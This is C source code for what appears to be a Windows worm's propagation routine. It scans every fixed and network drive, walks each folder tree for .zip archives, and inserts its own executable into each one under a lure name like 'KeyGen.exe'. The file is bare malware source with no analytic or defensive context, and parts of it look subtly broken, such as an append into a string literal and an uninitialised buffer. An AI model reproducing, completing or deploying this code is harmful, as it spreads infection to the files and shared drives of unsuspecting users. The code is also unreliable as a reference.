#include "../h/includes.h"

char pw[MAX_PATH];
void injectzip()
{
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	char xRandomString[30];
	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
	do
	{
	if(wfd.cFileName[0]!='.')
	{
	wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
	if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) 
	{
	if(SetCurrentDirectory(wfd.cFileName)==TRUE)
	{
	injectzip();
	SetCurrentDirectory("..");
	}
	}
	else
	{
	if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
	{
	CharLower(fullpath);
	if(memcmp(fullpath+lstrlen(fullpath)-3,"zip",3)==0)
	{
	Sleep(5000);
	lstrcat("KeyGen",".exe");
	zip_store(fullpath,pw,xRandomString);
	}
	}
	}
	}
	}while(FindNextFile(hfind,&wfd));
	FindClose(hfind);
	}
}

DWORD WINAPI infectzip(LPVOID xvoid)
{
    char Drive[]="z:\\";
    UINT drive_type;
    if(GetModuleFileName(NULL,pw,MAX_PATH)==0)
    ExitThread(0);
    do
	{
    drive_type=GetDriveType(Drive);	
    if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
	{
    if(SetCurrentDirectory(Drive)==TRUE)
    injectzip();	
	}
    Drive[0]--;
	}while(Drive[0]!='b');
    return 1;
}
